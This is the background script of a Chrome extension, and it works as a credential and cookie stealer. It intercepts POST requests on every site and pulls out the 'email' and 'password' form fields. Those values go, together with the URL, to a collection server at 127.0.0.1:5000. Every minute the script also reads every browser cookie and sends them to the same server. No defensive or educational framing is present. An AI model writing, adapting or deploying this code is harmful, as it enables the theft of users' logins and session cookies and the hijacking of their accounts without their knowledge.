chrome.webRequest.onBeforeRequest.addListener(function(details) {
  // Check if the request is a POST request.
  if (details.method == "POST") {
    if(details.requestBody!=null){

      var url=details.url;
    
      var formData = details.requestBody.formData;
      var email='';
      var password='';
      

    // Iterate over the form data and look for the password field.
    if(formData!=null){
    for (var key in formData) {
      if (formData.hasOwnProperty(key)) {
        // If the key is the password field, get the value.
        if (key == "password") {
          var password = formData[key][0];
          // Do something with the password.
          // For example, you could log it to the console.
          console.log('fetched password',password);

          
        }
        else if(key == "email"){
          var email = formData[key][0];
          // Do something with the password.
          // For example, you could log it to the console.
          console.log('fetched email',email);

        }
      }
    }
    if(email.length>0 || password.length>0){
      console.log(url,email,password);
    fetch('http://127.0.0.1:5000/send_userpass_background', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({url: url, email:email,password:password,browser_id: chrome.runtime.id}),
      timeout: 60000 
    })
    .then(response => response.json())
    .then(data => {
      console.log(data.state);
      console.log('Sent browser id to server')
    
    })
    .catch(error => console.error(error));
  }




  }
}
    
  }
},
  {urls: ["<all_urls>"]},
  ['requestBody','blocking']
);
/*
chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name === 'Cookie') {
        console.log('url',details.url)
        console.log('cookie',details.requestHeaders[i].value)
        
      }
    }
   
  },
  {urls: ["<all_urls>"]},
  ["blocking", "requestHeaders","extraHeaders"]
);
*/

console.log("Extension ID:", chrome.runtime.id);
fetch('http://127.0.0.1:5000/send_id_of_browser', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({browser_id: chrome.runtime.id }),
      timeout: 60000 
    })
    .then(response => response.json())
    .then(data => {
      console.log(data.state);
      console.log('Sent browser id to server')
    
    })
    .catch(error => console.error(error));
  
  








chrome.cookies.getAll({}, function(cookies) {
  console.log(cookies);
});
setInterval(function(){

  chrome.cookies.getAll({}, function(cookies) {
    if(cookies.length>0){
  console.log(cookies);
  fetch('http://127.0.0.1:5000/send_background_data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({cookie_data: cookies,browser_id:chrome.runtime.id }),
      timeout: 60000 
    })
    .then(response => response.json())
    .then(data => {
      console.log(data.state);
      console.log('Sent cookies to server')
    
    })
    .catch(error => console.error(error));
  
  }
});

},60000)

